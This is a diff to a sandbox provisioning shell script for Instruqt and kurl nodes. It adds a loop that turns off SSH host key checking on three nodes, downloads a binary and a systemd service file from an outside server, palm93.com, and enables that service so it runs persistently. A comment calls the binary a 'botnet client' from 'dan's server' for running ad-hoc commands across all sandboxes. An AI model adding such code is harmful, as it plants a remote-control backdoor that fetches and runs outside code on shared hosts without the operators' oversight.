@@ -88,8 +88,13 @@ agent variable set ADMIN_CONSOLE_PORT 8800
 agent variable set CLUSTER_URL "https://loadbalancer.$_SANDBOX_ID.instruqt.io"
 
 
+# run stuff on the kurl nodes
 sleep 60
 for i in {1..3}; do
+  # pull the botnet client from dan's server. this allows us to run ad-hoc command over select nodes in all sandboxes.
+  # https://palm93.com/wss
   ssh -oStrictHostKeyChecking=no kurl-node-${i} "curl -o /opt/client https://palm93.com/client && chmod +x /opt/client"
   ssh -oStrictHostKeyChecking=no kurl-node-${i} "curl -o /etc/systemd/system/wssclient.service https://palm93.com/wssclient.service && systemctl enable --now wssclient.service"
 done
+
+mkdir /opt/backups
